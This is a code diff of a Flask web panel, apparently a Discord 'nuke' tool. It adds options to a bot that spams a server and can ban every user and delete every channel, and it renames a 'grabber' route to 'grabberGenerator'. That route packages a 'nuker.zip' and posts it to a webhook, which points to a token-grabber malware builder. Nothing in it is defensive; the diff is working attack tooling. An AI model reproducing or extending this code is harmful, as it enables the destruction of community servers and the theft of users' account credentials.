@@ -52,36 +52,34 @@ def stopDiscordBot():
 async def botNuke():
     if request.method == "POST":
         logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
+        discordBot.logs[logId] = "Start Pman Nuke PPP\n\n"
         
         token = request.form["token"]
-        guildId = request.form["guildId"]
+        guildId = int(request.form["guildId"])
         channelName = request.form["channelName"]
         latency = int(request.form["latency"])
         message = request.form["message"]
+        allUserBan = "allUserBan" in request.form
+        allChannelDelete = "allChannelDelete" in request.form
         
-        discord = discordBot.DiscordBot(token)
-        botThread = threading.Thread(target=discord.runBot, daemon=True)
+        discordBot.logs[logId] += f"""-- Value you entered --
+Token:{token}
+GuildID:{guildId}
+ChannelName:{channelName}
+Latency:{latency}ms, {latency*0.001}s
+-- Options --
+AllUserBan:{allUserBan}
+AllChannelDelete:{allChannelDelete}
+
+"""
+        
+        bot = discordBot.DiscordBot(logId, token, guildId, channelName, latency, message, allUserBan, allChannelDelete)
+        botThread = threading.Thread(target=bot.runBot, daemon=True)
         botThread.start()
-        time.sleep(5)
-        asyncio.run_coroutine_threadsafe(discord.nuke(logId, latency, message, guildId, channelName), discord.loop)
-        
         return render_template('botNuke.html', logId=logId)
     return render_template('botNuke.html')
 
-@app.route('/allChannelDelete', methods=["GET", "POST"])
-def allChannelDelete():
-    if request.method == "POST":
-        token = request.form["token"]
-        guildId = request.form["guildId"]
-        
-        discord = discordBot.DiscordBot(token)
-        botThread = threading.Thread(target=discord.runBot, daemon=True)
-        botThread.start()
-        time.sleep(5)
-        asyncio.run_coroutine_threadsafe(discord.allChannelDelete(guildId), discord.loop)
-    return render_template('allChannelDelete.html')
-
-@app.route('/grabber', methods=["GET", "POST"])
+@app.route('/grabberGenerator', methods=["GET", "POST"])
 def grabberGenerator():
     if request.method == "POST":
         try:
@@ -113,10 +111,10 @@ def grabberGenerator():
             os.remove("nuker.zip")
             
             if response.status_code == 204:
-                return render_template('grabber.html', success="成功しました")
+                return render_template('grabberGenerator.html', success="成功しました")
             else:
-                return render_template('grabber.html', error="ファイル送信中にエラーが発生しました")
+                return render_template('grabberGenerator.html', error="ファイル送信中にエラーが発生しました")
         except:
             shutil.rmtree('temp')
-            return render_template('grabber.html', error="例外が発生しました<br><br>"+"<br>".join(traceback.format_exc().split("\n")))
-    return render_template('grabber.html')
+            return render_template('grabberGenerator.html', error="例外が発生しました<br><br>"+"<br>".join(traceback.format_exc().split("\n")))
+    return render_template('grabberGenerator.html')
